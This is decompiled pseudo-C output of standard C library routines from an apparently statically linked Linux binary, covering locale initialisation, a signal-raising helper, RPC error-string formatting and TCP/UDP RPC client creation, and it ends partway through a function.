	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ecx;
    Vffffffe0 = 0;
    Vffffffd8 = 1;
    Vffffffb4 = 0;
    do {
        ebx = A8 != 6 ? A8 != Vffffffb4 ? *(Vffffffb4 * 4 + 0x80790bc) : *Ac : *(Ac + Vffffffb4 * 4);
        al = 0;
        edi = ebx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = !ecx - 1;
        esi = Vffffffb4;
        *(ebp + esi * 4 - 28) = eax;
        eax = *(ebp + esi * 4 - 28);
        edx = Vffffffb4;
        eax = eax + *(edx * 4 + 0x806aa8c);
        Vffffffe0 = Vffffffe0 + eax + 2;
        if(edx > 0 && Vffffffd8 != 0 && L08057ADC(ebx, *Ac) != 0) {
            Vffffffd8 = 0;
        }
        esi = Vffffffb4 + 1;
        Vffffffc4 = esi;
        ebx = A8 != 6 ? A8 != Vffffffc4 ? *(Vffffffc4 * 4 + 0x80790bc) : *Ac : *(Ac + esi * 4);
        al = 0;
        edi = ebx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = !ecx - 1;
        edx = Vffffffc4;
        *(ebp + edx * 4 - 28) = eax;
        eax = *(ebp + edx * 4 - 28);
        esi = Vffffffc4;
        eax = eax + *(esi * 4 + 0x806aa8c);
        Vffffffe0 = Vffffffe0 + eax + 2;
        if(esi > 0 && Vffffffd8 != 0 && L08057ADC(ebx, *Ac) != 0) {
            Vffffffd8 = 0;
        }
        Vffffffb4 = Vffffffb4 + 2;
    } while(Vffffffb4 <= 5);
    if(Vffffffd8 != 0) {
        eax = L0805BD74(Vffffffe4 + 1);
        Vffffffdc = eax;
        if(Vffffffdc == 0) {
            edx = Ac;
            eax = *edx;
            edi = 0x806aabe;
            ecx = 2;
            esi = eax;
            asm("cld");
            asm("repe cmpsb");
            == ? L08062abf : ;
            eax = *edx;
            edi = 0x806aac0;
            ecx = 6;
            esi = eax;
            asm("cld");
            asm("repe cmpsb");
            != ? 0x8062acc : ;
            eax = 0x806aabc;
            goto L08062c8f;
            *L08078B14 = 22;
            eax = 0;
            goto L08062c8f;
        }
        L0805652C(Vffffffdc, *Ac, Vffffffe4 + 1);
    } else {
        eax = L0805BD74(Vffffffe0);
        Vffffffdc = eax;
        if(Vffffffdc == 0) {
            eax = 0;
            goto L08062c8f;
        }
        ebx = Vffffffdc;
        Vffffffb4 = 0;
        Vffffffd4 = 0x806aa8c;
        Vffffffd0 = 0x806aa8c;
        do {
            edi = A8 != 6 ? A8 != Vffffffb4 ? *(Vffffffb4 * 4 + 0x80790bc) : *Ac : *(Ac + Vffffffb4 * 4);
            L0805652C(ebx, *(Vffffffb4 * 4 + 0x806aa34), *Vffffffd0);
            ebx = ebx + *Vffffffd4;
            *ebx = 61;
            ebx = ebx + 1;
            esi = Vffffffb4;
            L0805652C(ebx, edi, *(ebp + esi * 4 - 28));
            ebx = ebx + *(ebp + esi * 4 - 28);
            *ebx = 59;
            ebx = ebx + 1;
            edi = Vffffffb4 + 1;
            if(A8 != 6) {
                if(A8 != edi) {
                    edx = *(edi * 4 + 0x80790bc);
                    goto L08062bc7;
                }
                Vffffffcc = *Ac;
            } else {
                edx = *(Ac + edi * 4);
L08062bc7:
                Vffffffcc = edx;
            }
            eax = *(edi * 4 + 0x806aa34);
            L0805652C(ebx, eax, *(Vffffffd0 + 4));
            ebx = ebx + *(Vffffffd4 + 4);
            *ebx = 61;
            ebx = ebx + 1;
            L0805652C(ebx, Vffffffcc, *(ebp + edi * 4 - 28));
            ebx = ebx + *(ebp + edi * 4 - 28);
            *ebx = 59;
            ebx = ebx + 1;
            edi = Vffffffb4 + 2;
            if(A8 != 6) {
                if(A8 != edi) {
                    edx = *(edi * 4 + 0x80790bc);
                    goto L08062c33;
                }
                Vffffffc8 = *Ac;
            } else {
                edx = *(Ac + edi * 4);
L08062c33:
                Vffffffc8 = edx;
            }
            eax = *(edi * 4 + 0x806aa34);
            L0805652C(ebx, eax, *(Vffffffd0 + 8));
            ebx = ebx + *(Vffffffd4 + 8);
            *ebx = 61;
            ebx = ebx + 1;
            L0805652C(ebx, Vffffffc8, *(ebp + edi * 4 - 28));
            ebx = ebx + *(ebp + edi * 4 - 28);
            *ebx = 59;
            ebx = ebx + 1;
            Vffffffd4 = Vffffffd4 + 12;
            Vffffffd0 = Vffffffd0 + 12;
            Vffffffb4 = Vffffffb4 + 3;
        } while(Vffffffb4 <= 5);
        *(ebx - 1) = 0;
    }
    eax = Vffffffdc;
L08062c8f:
    esp = ebp - 88;
}



L08062C9C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ecx;
    eax = A8;
    edx = *L080790D4;
    *L080790D4 = eax;
    if(edx != 0x806aabc) {
        eax = L0805C290(edx);
    }
}



L08062CC8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ecx;
    eax = A8;
    ecx = *(eax * 4 + 0x80790bc);
    *(eax * 4 + 0x80790bc) = Ac;
    if(ecx != 0x806aabc) {
        eax = L0805C290(ecx);
    }
}



L08062CF8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = ecx;
    if(*(A8 * 4 + 0x806aa04) != 0) {
        eax = *(A8 * 4 + 0x806aa04);
        esi = *eax;
        *eax = Ac;
        if(*(A8 * 4 + 0x806aaa4) != 0) {
            eax = *( *(A8 * 4 + 0x806aaa4))();
        }
        if(*(A8 * 4 + 0x806aa1c) != esi) {
            eax = L08067040(esi);
        }
    }
    esp = ebp - 12;
}



L08062D4C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    if(ebx <= 6) {
        != ? 0x8062d6c : ;
        eax = *L080790D4;
        goto L08062d73;
        eax = *(ebx * 4 + 0x80790bc);
L08062d73:
        if(Ac == 0 || Ac == eax) {
            goto L08063642;
        }
        if(ebx == 6) {
            if(*Ac == 0) {
                Ac = L08055668("LC_ALL");
            }
            if(Ac == 0 || *Ac == 0) {
                ebx = 0;
                do {
                    eax = L08055668( *(ebx * 4 + 0x806aa34));
                    Ac = eax;
                    if(eax == 0 || *eax == 0) {
                        Ac = L08055668("LANG");
                    }
                    if(Ac == 0 || *Ac == 0) {
                        Ac = *(ebx * 4 + 0x80790bc);
                    }
                    *(ebp + ebx * 4 - 24) = Ac;
                    edi = ebx + 1;
                    eax = L08055668( *(edi * 4 + 0x806aa34));
                    Ac = eax;
                    if(eax == 0 || *eax == 0) {
                        Ac = L08055668("LANG");
                    }
                    if(Ac == 0 || *Ac == 0) {
                        Ac = *(edi * 4 + 0x80790bc);
                    }
                    *(ebp + edi * 4 - 24) = Ac;
                    edi = ebx + 2;
                    eax = L08055668( *(edi * 4 + 0x806aa34));
                    Ac = eax;
                    if(eax == 0 || *eax == 0) {
                        Ac = L08055668("LANG");
                    }
                    if(Ac == 0 || *Ac == 0) {
                        Ac = *(edi * 4 + 0x80790bc);
                    }
                    *(ebp + edi * 4 - 24) = Ac;
                    ebx = ebx + 3;
                } while(ebx <= 5);
            } else {
                al = 0;
                edi = Ac;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                edi = !ecx;
                eax = Ac;
                Vfffffffc = eax;
                Vfffffff8 = eax;
                Vfffffff4 = eax;
                Vfffffff0 = eax;
                Vffffffec = eax;
                Vffffffe8 = eax;
                ebx = 6;
                (save)59;
                eax = L08057970(Vffffffe8);
                Vffffffc4 = eax;
                if(Vffffffc4 != 0) {
                    esp = esp - (edi + 3 & 252);
                    Vffffffbc = esp;
                    for(L0805652C(Vffffffbc, Ac, edi); 1; Vffffffbc = eax + 1) {
                        (save)61;
                        esi = Vffffffbc;
                        eax = L08057970(esi);
                        Vffffffc4 = eax;
                        if(eax == 0) {
                            break;
                        }
                        Vffffffc0 = 0;
                        eax = eax - esi;
                        if(*L0806AA8C == eax) {
                            esi = *L0806AA34;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 1;
                        if(*L0806AA90 == eax) {
                            esi = *L0806AA38;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 2;
                        if(*L0806AA94 == eax) {
                            esi = *L0806AA3C;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 3;
                        if(*L0806AA98 == eax) {
                            esi = *L0806AA40;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 4;
                        if(*L0806AA9C == eax) {
                            esi = *L0806AA44;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 5;
                        if(*L0806AAA0 == eax) {
                            esi = *L0806AA48;
                            edi = Vffffffbc;
                            ecx = eax;
                            asm("cld");
                            asm("repe cmpsb");
                            == ? L08063000 : ;
                        }
                        Vffffffc0 = 6;
                        if(Vffffffc0 == 6) {
                            goto L0806360c;
                        }
                        if(Vffffffc0 > 5) {
                            continue;
                        }
                        (save)59;
                        Vffffffc4 = Vffffffc4 + 1;
                        eax = L08057970(Vffffffc4);
                        *(ebp + Vffffffc0 * 4 - 24) = Vffffffc4;
                        if(eax == 0) {
                            break;
                        }
                        *eax = 0;
                    }
                    Vffffffc0 = 0;
                    eax = Ac;
                    do {
                        esi = Vffffffc0;
                        if(*(ebp + esi * 4 - 24) == eax) {
                            goto L0806360c;
                        }
                        esi = esi + 1;
                        Vffffffc0 = esi;
                    } while(Vffffffc0 <= 5);
                    goto L080633ed;
L080630f4:
                    ebx = ebx + 1;
                    if(ebx > 5) {
                        goto L08063616;
                    }
                    eax = 6 - ebx & 3;
                    if(ebx < 6) {
                        if(eax == 0) {
                            goto L080631cc;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                if(*(ebx * 4 + 0x806aa04) != 0) {
                                    L08067040( *(ebp + ebx * 4 - 48));
                                }
                                if(*(ebp + ebx * 4 - 24) != 0 && *(ebp + ebx * 4 - 24) != 0x806aabc) {
                                    L0805C290( *(ebp + ebx * 4 - 24));
                                }
                                ebx = ebx + 1;
                            }
                            if(*(ebx * 4 + 0x806aa04) != 0) {
                                L08067040( *(ebp + ebx * 4 - 48));
                            }
                            if(*(ebp + ebx * 4 - 24) != 0 && *(ebp + ebx * 4 - 24) != 0x806aabc) {
                                L0805C290( *(ebp + ebx * 4 - 24));
                            }
                            ebx = ebx + 1;
                        }
                    }
                    if(*(ebx * 4 + 0x806aa04) != 0) {
                        L08067040( *(ebp + ebx * 4 - 48));
                    }
                    if(*(ebp + ebx * 4 - 24) != 0 && *(ebp + ebx * 4 - 24) != 0x806aabc) {
                        L0805C290( *(ebp + ebx * 4 - 24));
                    }
                    ebx = ebx + 1;
                    if(ebx > 5) {
                        goto L08063616;
                    }
L080631cc:
                    do {
                        if(*(ebx * 4 + 0x806aa04) != 0) {
                            L08067040( *(ebp + ebx * 4 - 48));
                        }
                        if(*(ebp + ebx * 4 - 24) != 0 && *(ebp + ebx * 4 - 24) != 0x806aabc) {
                            L0805C290( *(ebp + ebx * 4 - 24));
                        }
                        edi = ebx + 1;
                        if(*(edi * 4 + 0x806aa04) != 0) {
                            L08067040( *(ebp + edi * 4 - 48));
                        }
                        if(*(ebp + edi * 4 - 24) != 0 && *(ebp + edi * 4 - 24) != 0x806aabc) {
                            L0805C290( *(ebp + edi * 4 - 24));
                        }
                        edi = ebx + 2;
                        if(*(edi * 4 + 0x806aa04) != 0) {
                            L08067040( *(ebp + edi * 4 - 48));
                        }
                        if(*(ebp + edi * 4 - 24) != 0 && *(ebp + edi * 4 - 24) != 0x806aabc) {
                            L0805C290( *(ebp + edi * 4 - 24));
                        }
                        edi = ebx + 3;
                        if(*(edi * 4 + 0x806aa04) != 0) {
                            L08067040( *(ebp + edi * 4 - 48));
                        }
                        if(*(ebp + edi * 4 - 24) != 0 && *(ebp + edi * 4 - 24) != 0x806aabc) {
                            L0805C290( *(ebp + edi * 4 - 24));
                        }
                        ebx = ebx + 4;
                    } while(ebx <= 5);
                    goto L08063616;
                    ebx = ebx + 1;
                    if(ebx <= 5) {
                        eax = 6 - ebx & 3;
                        if(ebx < 6) {
                            if(eax == 0) {
                                goto L08063380;
                            }
                            if(eax > 1) {
                                if(eax > 2) {
                                    if(*(ebp + ebx * 4 - 24) != 0x806aabc) {
                                        L0805C290( *(ebp + ebx * 4 - 24));
                                    }
                                    ebx = ebx + 1;
                                }
                                if(*(ebp + ebx * 4 - 24) != 0x806aabc) {
                                    L0805C290( *(ebp + ebx * 4 - 24));
                                }
                                ebx = ebx + 1;
                            }
                        }
                        if(*(ebp + ebx * 4 - 24) != 0x806aabc) {
                            L0805C290( *(ebp + ebx * 4 - 24));
                        }
                        ebx = ebx + 1;
                        if(ebx <= 5) {
L08063380:
                            if(*(ebp + ebx * 4 - 24) != 0x806aabc) {
                                L0805C290( *(ebp + ebx * 4 - 24));
                            }
                            eax = ebx + 1;
                            if(*(ebp + eax * 4 - 24) != 0x806aabc) {
                                L0805C290( *(ebp + eax * 4 - 24));
                            }
                            eax = ebx + 2;
                            if(*(ebp + eax * 4 - 24) != 0x806aabc) {
                                L0805C290( *(ebp + eax * 4 - 24));
                            }
                            eax = ebx + 3;
                            if(*(ebp + eax * 4 - 24) != 0x806aabc) {
                                L0805C290( *(ebp + eax * 4 - 24));
                            }
                            ebx = ebx + 4;
                            if(ebx <= 5) {
                                goto L08063380;
                            }
                        }
                    }
                }
            }
L080633ed:
            do {
                eax = ebx;
                ebx = ebx - 1;
                if(eax <= 0) {
                    goto L080633fe;
                }
                if(*(ebx * 4 + 0x806aa04) == 0) {
                    ecx = ebp;
                    eax = L080628F8( *(ebp + ebx * 4 - 24));
                    *(ebp + ebx * 4 - 24) = eax;
                    if(*(ebp + ebx * 4 - 24) != 0) {
                        goto L080633ed;
                    }
                    esi = 0;
                    edi = 0x806aabe;
                    ecx = 2;
                    asm("cld");
                    asm("repe cmpsb");
                    == ? L080632fd : ;
                    esi = 0;
                    edi = 0x806aac0;
                    ecx = 6;
                    asm("cld");
                    asm("repe cmpsb");
                    != ? 0x806330c : ;
                } else {
                    eax = L08066BFC(ebx, ebp + ebx * 4 - 24);
                    *(ebp + ebx * 4 - 48) = eax;
                    if(*(ebp + ebx * 4 - 48) != 0) {
                        goto L08063091;
                    }
                    esi = *(ebp + ebx * 4 - 24);
                    edi = 0x806aabe;
                    ecx = 2;
                    asm("cld");
                    asm("repe cmpsb");
                    if(!(ebx = ebx - 1)) {
                        esi = *(ebp + ebx * 4 - 24);
                        edi = 0x806aac0;
                        ecx = 6;
                        asm("cld");
                        asm("repe cmpsb");
                        != ? 0x80630f4 : ;
                    }
                    if(*(ebp + ebx * 4 - 48) == 0) {
                        *(ebp + ebx * 4 - 48) = *(ebx * 4 + 0x806aa1c);
                    }
                }
                *(ebp + ebx * 4 - 24) = 0x806aabc;
                goto L080633ed;
L08063091:
                ecx = ebp;
                eax = L080628F8( *(ebp + ebx * 4 - 24));
                *(ebp + ebx * 4 - 24) = eax;
            } while(*(ebp + ebx * 4 - 24) != 0);
            goto L080630f4;
L080633fe:
            ecx = ebp;
            eax = L08062940(6, & Vffffffe8);
            Vffffffc8 = eax;
            if(Vffffffc8 == 0) {
                ebx = -1;
                goto L080630f4;
            }
            ebx = 0;
            ecx = ebp;
            L08062CF8(0, *(ebp + -48));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(0);
            ebx = 1;
            ecx = ebp;
            L08062CF8(1, *(ebp + -44));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(1);
            ebx = 2;
            ecx = ebp;
            L08062CF8(2, *(ebp + -40));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(2);
            ebx = 3;
            ecx = ebp;
            L08062CF8(3, *(ebp + -36));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(3);
            ebx = 4;
            ecx = ebp;
            L08062CF8(4, *(ebp + -32));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(4);
            ebx = 5;
            ecx = ebp;
            L08062CF8(5, *(ebp + -28));
            (save) *(ebp + ebx * 4 - 24);
            ecx = ebp;
            L08062CC8(5);
            (save)Vffffffc8;
            ecx = ebp;
            L08062C9C();
            eax = Vffffffc8;
            goto L08063642;
        }
        if(*Ac == 0) {
            eax = L08055668( *(ebx * 4 + 0x806aa34));
            Ac = eax;
            if(eax == 0 || *eax == 0) {
                Ac = L08055668("LANG");
            }
            if(Ac == 0) {
                goto L08063546;
            }
            if(*Ac == 0) {
L08063546:
                Ac = *(ebx * 4 + 0x80790bc);
            }
        }
        ecx = ebp;
        eax = L080628F8(Ac);
        Vffffffcc = eax;
        if(Vffffffcc == 0) {
            esi = Ac;
            edi = 0x806aabe;
            ecx = 2;
            asm("cld");
            asm("repe cmpsb");
            == ? L0806358d : ;
            esi = Ac;
            edi = 0x806aac0;
            ecx = 6;
            asm("cld");
            asm("repe cmpsb");
            != ? 0x806360c : ;
            Vffffffcc = 0x806aabc;
        }
        ecx = ebp;
        eax = L08062940(ebx, & Vffffffcc);
        Vffffffc8 = eax;
        if(Vffffffc8 == 0) {
            if(Vffffffcc == 0x806aabc) {
                goto L0806360c;
            }
            L0805C290(Vffffffcc);
            goto L0806360c;
        }
        if(*(ebx * 4 + 0x806aa04) == 0) {
            goto L08063628;
        }
        eax = L08066BFC(ebx, & Ac);
        if(eax == 0) {
            esi = Ac;
            edi = 0x806aabe;
            ecx = 2;
            asm("cld");
            asm("repe cmpsb");
            == ? L08063603 : ;
            esi = Ac;
            edi = 0x806aac0;
            ecx = 6;
            asm("cld");
            asm("repe cmpsb");
            != ? 0x806360c : ;
            eax = *(ebx * 4 + 0x806aa1c);
        }
    } else {
L0806360c:
        *L08078B14 = 22;
L08063616:
        eax = 0;
        goto L08063642;
    }
    ecx = ebp;
    L08062CF8(ebx, eax);
L08063628:
    (save)Vffffffcc;
    ecx = ebp;
    L08062CC8(ebx);
    ecx = ebp;
    L08062C9C(Vffffffc8);
    eax = Vffffffcc;
L08063642:
    esp = ebp - 80;
}


// kills current process with signal passed as parameter
L0806364C(A8)
     
/* unknown */ void  A8;
{



    return(kill(getpid(), A8));
}



L08063664()
{



    if(*L0807E750 == 0) {
        *L0807E750 = L0805BD74(256);
    }
    return(*L0807E750);
}


L08063688(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A8;
    Vfffffff0 = L08063664();
    ebx = Vfffffff0;
    if(ebx == 0) {
        eax = 0;
    } else {
        edx = *(esi + 4);
        (save) & Vfffffff4;
        (save)esi;
        *( *(edx + 8))();
        L0804F808(ebx, "%s: ", Ac);
        (save)ebx;
        ebx = ebx + L080662B0();
        (save)Vfffffff4;
        (save)L080638B8();
        L08056640(ebx);
        (save)ebx;
        ebx = ebx + L080662B0();
        L0805E954();
        esp = esp + 4;
        if(Vfffffff4 <= 17) {
            goto *(Vfffffff4 * 4 + 0x8063708)[L0806387a, L0806387a, L0806387a, L08063750, L08063750, L0806387a, L0806379c, L080637c4, L0806387a, L08063838, L0806387a, L0806387a, L0806387a, L0806387a, L0806387a, L0806387a, L0806387a, L0806387a, ]goto ( *(Vfffffff4 * 4 + 0x8063708));
            (save) *(Vfffffff8 * 4 + 0x806ae98);
            (save)L0805E584( *L08078F9C, 1, Vfffffff8 + 1);
            L0804F808(ebx, L0805E584( *L08078F9C, 9, 1), "; errno = %s");
            (save)ebx;
            ebx = ebx + L080662B0();
            esp = esp + 32;
            goto L0806387a;
            (save)Vfffffffc;
            (save)Vfffffff8;
            (save)"; low version = %lu, high version = %lu";
            (save)L0805E584( *L08078F9C, 9, 2);
            goto L08063869;
            (save)Vfffffff8;
            esi = L08063A74();
            L0804F808(ebx, L0805E584( *L08078F9C, 9, 3), "; why = ");
            (save)ebx;
            ebx = ebx + L080662B0();
            esp = esp + 32;
            if(esi != 0) {
                (save)esi;
                (save)"%s";
            } else {
                (save)Vfffffff8;
                (save)"(unknown authentication error - %d)";
                (save)L0805E584( *L08078F9C, 9, 4);
            }
            (save)ebx;
            L0804F808();
            esp = esp + 12;
            ebx = ebx + L080662B0(ebx);
            goto L0806387a;
            (save)Vfffffffc;
            (save)Vfffffff8;
            (save)"; low version = %lu, high version = %lu";
            (save)L0805E584( *L08078F9C, 9, 2);
        } else {
            (save)Vfffffffc;
            (save)Vfffffff8;
            (save)"; s1 = %lu, s2 = %lu";
        }
L08063869:
        (save)ebx;
        L0804F808();
        (save)ebx;
        ebx = ebx + L080662B0();
        esp = esp + 20;
L0806387a:
        L0804F808(ebx, "\n");
        eax = Vfffffff0;
    }
    esp = ebp - 28;
}



L08063894(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(L0804F680(0x80787a4, "%s", L08063688(A8, Ac)));
}


L080638B8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    L0805E954();
    ebx = 0;
    edi = 0x80790d8;
    ecx = 0;
    eax = 0x80790d8;
    do {
        if(*eax == A8) {
            goto L080638dc;
        }
        edx = ecx + 8;
        if(*(eax + 8) == A8) {
            goto L080638f0;
        }
        edx = ecx + 16;
        if(*(eax + 16) == A8) {
            goto L08063904;
        }
        eax = eax + 24;
        ecx = ecx + 24;
        ebx = ebx + 3;
    } while(ebx <= 17);
    goto L0806391a;
L080638dc:
    (save) *(edi + ecx + 4);
    (save)A8 + 1;
    return(L0805E584( *L08078F9C, 8));
L080638f0:
    (save) *(edi + edx + 4);
    (save)A8 + 1;
    return(L0805E584( *L08078F9C, 8));
L08063904:
    (save) *(edi + edx + 4);
    (save)A8 + 1;
    return(L0805E584( *L08078F9C, 8));
L0806391a:
    (save)"RPC: (unknown error code)";
    (save)19;
    return(L0805E584( *L08078F9C, 8));
}





L08063A74(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    L0805E954();
    ebx = 0;
    edi = 0x8079168;
    ecx = 0;
    eax = 0x8079168;
    do {
        if(*eax == A8) {
            goto L08063a98;
        }
        edx = ecx + 8;
        if(*(eax + 8) == A8) {
            goto L08063aac;
        }
        edx = ecx + 16;
        if(*(eax + 16) == A8) {
            goto L08063ac0;
        }
        edx = ecx + 24;
        if(*(eax + 24) == A8) {
            goto L08063ad4;
        }
        eax = eax + 32;
        ecx = ecx + 32;
        ebx = ebx + 4;
    } while(ebx <= 7);
    goto L08063af6;
L08063a98:
    (save) *(edi + ecx + 4);
    eax = ebx + 1;
    goto L08063ad8;
L08063aac:
    (save) *(edi + edx + 4);
    eax = ebx + 2;
    goto L08063ad8;
L08063ac0:
    (save) *(edi + edx + 4);
    eax = ebx + 3;
    goto L08063ad8;
L08063ad4:
    (save) *(edi + edx + 4);
    eax = ebx + 4;
L08063ad8:
    eax = L0805E584( *L08078F9C, 7, eax);
    goto L08063af8;
L08063af6:
    eax = 0;
L08063af8:
}



L08063B04(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;



    ebx = A8;
    esi = 0;
    L0805E954();
    edi = L0805BD74(12);
    if(edi != 0) {
        esi = L0805BD74(100);
        if(esi != 0) {
            goto L08063b78;
        }
    }
    (save)"out of memory";
    L0804F680(0x80787a4, "clnttcp_create: %s\n", L0805E584( *L08078F9C, 10, 1));
    *L08079220 = 12;
    *L08079228 = *L08078B14;
    goto L08063d08;
L08063b78:
    if(*(ebx + 2) == 0) {
        L080649E0(ebx, Ac, A10, 6);
        if(ax == 0) {
            goto L08063d08;
        }
        asm("xchg al,ah");
        *(ebx + 2) = ax;
    }
    if(*A14 < 0) {
        eax = socket(AF_INET, SOCK_STREAM, TCP);
        *A14 = eax;
        (save)0;
        (save) *A14;
        L08066A50();
        esp = esp + 20;
        edx = A14;
        if(*edx >= 0) {
            if(connect(*edx, ebx, 16) >= 0) {
                goto L08063c04;
            }
        }
        *L08079220 = 12;
        *L08079228 = *L08078B14;
        edx = A14;
        if(*edx < 0) {
            goto L08063d08;
        }
        goto L08063ca1;
L08063c04:
        *(esi + 4) = 1;
    } else {
        *(esi + 4) = 0;
    }
    *esi = *A14;
    *(esi + 12) = 0;
    *(esi + 16) = 0;
    *(esi + 20) = *ebx;
    *(esi + 24) = *(ebx + 4);
    *(esi + 28) = *(ebx + 8);
    *(esi + 32) = *(ebx + 12);
    gettimeofday( & Vffffffc8, 0);
    Vffffffd0 = getpid() ^ Vffffffc8 ^ Vffffffcc;
    Vffffffd4 = 0;
    Vffffffd8 = 2;
    Vffffffdc = Ac;
    Vffffffe0 = A10;
    (save)0;
    (save)24;
    (save)esi + 48;
    ebx = esi + 76;
    (save)ebx;
    L08065408();
    (save) & Vffffffd0;
    (save)ebx;
    esp = esp + 32;
    if(L08064C9C() == 0) {
        if(*(esi + 4) != 0) {
            edx = A14;
L08063ca1:
            close( *edx);
        }
    } else {
        eax = *(esi + 80);
        ebx = esi + 76;
        *(esi + 72) = *( *(eax + 16))(ebx);
        eax = *(esi + 80);
        if(*(eax + 28) != 0) {
            *( *(eax + 28))(ebx);
        }
        (save)0x8064174;
        (save)0x8064074;
        (save)esi;
        (save)A1c;
        (save)A18;
        (save)esi + 76;
        L08065750();
        *(edi + 4) = 0x80791a8;
        *(edi + 8) = esi;
        *edi = L08067094();
        eax = edi;
        goto L08063d16;
    }
L08063d08:
    L0805C290(esi);
    L0805C290(edi);
    eax = 0;
L08063d16:
    esp = ebp - 68;
}











L080641C8(A8, Ac, A10, A14, A18, A1c, A20, A24)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;



    edi = A20;
    esi = A24;
    ebx = 0;
    L0805E954();
    eax = L0805BD74(12);
    Vffffffc0 = eax;
    if(Vffffffc0 != 0) {
        edi = edi + 3 & -4;
        esi = esi + 3 & -4;
        ebx = L0805BD74(edi + esi + 100);
        if(ebx != 0) {
            goto L08064254;
        }
    }
    (save)"out of memory";
    L0804F680(0x80787a4, "clntudp_create: %s\n", L0805E584( *L08078F9C, 10, 1));
    *L08079220 = 12;
    *L08079228 = *L08078B14;
    goto L080643d8;
L08064254:
    *(ebx + 88) = ebx + esi + 96;
    gettimeofday( & Vffffffc8, 0);
    if(*(A8 + 2) == 0) {
        if(L080649E0(A8, Ac, A10, 17) == 0) {
            goto L080643d8;
        }
        edx = eax;
        asm("xchg dl,dh");
        *(A8 + 2) = dx;
    }
    A8 = Vffffffc0;
    *(A8 + 4) = 0x80791c0;
    *(A8 + 8) = ebx;
    *(ebx + 8) = *A8;
    *(ebx + 12) = *(A8 + 4);
    *(ebx + 16) = *(A8 + 8);
    *(ebx + 20) = *(A8 + 12);
    *(ebx + 24) = 16;
    *(ebx + 28) = A14;
    *(ebx + 32) = A18;
    *(ebx + 36) = -1;
    *(ebx + 40) = -1;
    *(ebx + 84) = edi;
    *(ebx + 92) = esi;
    Vffffffd0 = getpid() ^ Vffffffc8 ^ Vffffffcc;
    Vffffffd4 = 0;
    Vffffffd8 = 2;
    Vffffffdc = Ac;
    Vffffffe0 = A10;
    (save)0;
    (save)edi;
    (save) *(ebx + 88);
    esi = ebx + 56;
    (save)esi;
    L08065408();
    (save) & Vffffffd0;
    (save)esi;
    esp = esp + 24;
    if(L08064C9C() != 0) {
        *(ebx + 80) = *( *( *(ebx + 60) + 16))(esi);
        if(*A1c < 0) {
            Vffffffc4 = 1;
            eax = socket(AF_INET, SOCK_DGRAM, UDP);
            *A1c = eax;
            if(*A1c < 0) {
